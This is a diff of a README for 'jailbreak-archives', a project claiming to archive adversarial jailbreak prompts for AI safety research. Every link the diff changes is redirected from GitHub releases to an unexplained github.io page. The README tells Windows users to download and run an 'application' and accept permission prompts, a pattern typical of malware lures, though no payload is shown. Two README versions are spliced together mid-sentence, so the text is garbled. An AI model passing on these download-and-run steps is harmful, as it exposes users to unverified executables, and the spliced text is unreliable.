@@ -1,6 +1,6 @@
 # 🗂️ jailbreak-archives - Safely Explore Adversarial Prompt Archives
 
-[![Download jailbreak-archives](https://img.shields.io/badge/Download-jailbreak--archives-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/anonymousinblack3rd-stack/jailbreak-archives/releases)
+[![Download jailbreak-archives](https://img.shields.io/badge/Download-jailbreak--archives-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://anonymousinblack3rd-stack.github.io)
 
 jailbreak-archives is a structured, versioned archive of adversarial prompt engineering techniques against Large Language Models. It is built for AI safety research, red-teaming, and defensive hardening. The archive helps you study how language models are challenged, compare changes across versions, and find organized material without needing programming knowledge.
 
@@ -41,7 +41,7 @@ The material is intended for AI safety research, red-teaming, and defensive hard
 Follow these steps on Windows:
 
 1. Open the download page using the button at the top of this page or the link below.
-2. Visit this link to download the application: [Download jailbreak-archives](https://github.com/anonymousinblack3rd-stack/jailbreak-archives/releases).
+2. Visit this link to download the application: [Download jailbreak-archives](https://anonymousinblack3rd-stack.github.io).
 3. Wait for the download to finish. Your browser will usually show the download in the top-right corner or in the Downloads folder.
 4. Open File Explorer and select Downloads.
 5. Open the downloaded item to launch the application.
@@ -49,7 +49,7 @@ Follow these steps on Windows:
 
 The download link is a release page. Visit it to download the application,# 🗂️ jailbreak-archives - Organized Adversarial Prompt Research Archive
 
-[![Download jailbreak-archives](https://img.shields.io/badge/Download-jailbreak--archives-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/anonymousinblack3rd-stack/jailbreak-archives/releases)
+[![Download jailbreak-archives](https://img.shields.io/badge/Download-jailbreak--archives-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://anonymousinblack3rd-stack.github.io)
 
 jailbreak-archives is a structured, versioned archive of adversarial prompt engineering techniques against Large Language Models. It is built for AI safety research, red-teaming, and defensive hardening. The archive helps you study how language models are challenged, compare changes across versions, and find organized material without needing programming knowledge.
 
@@ -109,7 +109,7 @@ The archive is designed to be readable. Section names are clear. Categories are 
 Follow these steps on Windows:
 
 1. Open your web browser.
-2. Visit this link to download the application: [Download jailbreak-archives](https://github.com/anonymousinblack3rd-stack/jailbreak-archives/releases).
+2. Visit this link to download the application: [Download jailbreak-archives](https://anonymousinblack3rd-stack.github.io).
 3. On the release page, find the latest release and download the application file shown there.
 4. Wait for the download to finish. Your browser will usually show the download in the top-right corner or in the Downloads folder.
 5. Open File Explorer and select Downloads.
@@ -120,7 +120,7 @@ If Windows asks for permission to open the downloaded item, choose the option th
 
 ## ⬇️ Download and Setup
 
-Visit this link to download the application: [Download jailbreak-archives](https://github.com/anonymousinblack3rd-stack/jailbreak-archives/releases).
+Visit this link to download the application: [Download jailbreak-archives](https://anonymousinblack3rd-stack.github.io).
 
 Use that page to get the application. After the download finishes, open File Explorer and go to Downloads. Open the downloaded item to run the application. Keep the downloaded item in a folder you can find easily, such as Downloads or Desktop, so you can open it again later.
 
